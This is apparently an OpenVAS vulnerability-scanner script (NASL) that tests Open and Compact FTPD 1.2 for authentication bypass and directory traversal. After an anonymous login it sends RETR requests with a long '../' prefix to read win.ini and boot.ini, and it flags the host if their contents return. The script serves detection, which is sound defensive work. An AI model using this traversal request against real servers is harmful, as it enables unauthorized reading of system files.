###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_n_compact_ftpd_server_mult_vun.nasl 11 2013-10-27 10:12:02Z jan $
#
# Open and Compact FTPD Auth Bypass and Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if(description)
{
  script_id(803733);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-12 11:33:28 +0530 (Mon, 12 Aug 2013)");
  script_name("Open and Compact FTPD Auth Bypass and Directory Traversal Vulnerabilities");

   tag_summary =
"The host is running Open and Compact FTPD server and is prone to
authentication bypass and directory traversal vulnerabilities.";

  tag_vuldetect =
"Send the crafted directory traversal attack request and check whether it
is able to read the system file or not.";

  tag_insight =
"Multiple flaws due to,
- Access not being restricted to various FTP commands before a user is
  properly authenticated.
- An Error in handling certain requests.";

  tag_impact =
"Successful exploitation will allow attackers to execute FTP commands
without any authentication and read arbitrary files on the affected
application.";

  tag_affected =
"Open and Compact FTP Server version 1.2 and prior.";

  tag_solution =
"No solution or patch is available as of 12th August, 2013. Information
regarding this issue will updated once the solution details are available.
For updates refer to http://sourceforge.net/projects/open-ftpd ";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://1337day.com/exploit/21078");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013080072");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122747");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/open-and-compact-ftp-server-12-bypass-directory-traversal");
  script_summary("Check for the directory traversal attack on Open and Compact FTP server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  exit(0);
}


include("ftp_func.inc");

ftpPort = "";
banner = "";
soc = "";
user = "";
pass = "";

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("Gabriel's FTP Server" >!< banner){
  exit(0);
}

## create the socket
soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

## Get the FTP user name and password
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## if not user name is given try with anonymous
if(!user){
  user = "anonymous";
}

## if not password is given try with anonymous
if(!pass){
  pass = string("anonymous");
}

## Send the user name
send(socket:soc, data:string("USER ", user, "\r\n"));
buf = recv(socket:soc, length:512);

## send the password
send(socket:soc, data:string("PASS ", pass, "\r\n"));
buf = recv(socket:soc, length:512);

## Confirm the login success
if("230 User" >!< buf && "logged in" >!< buf)
{
 close(soc);
 exit(0);
}

## Change to PASV Mode
ftpPort2 = ftp_get_pasv_port(socket:soc);
if(!ftpPort2){
  close(soc);
  exit(0);
}

## Open a Socket and Send Crafted request
soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2)
{
  close(soc);
  exit(0);
}

## List the possible system files
files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
foreach file (files)
{
  ## Construct the attack request
  file = "../../../../../../../../../../../../../../../../" + file;
  attackreq = string("RETR ", file);
  send(socket:soc, data:string(attackreq, "\r\n"));

  result = ftp_recv_data(socket:soc2);

  ## confirm the exploit
  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
                                     || "[boot loader]" >< result)
  {
    security_hole(port:ftpPort);
    close(soc2);
    close(soc);
    exit(0);
  }
}

close(soc);
close(soc2);
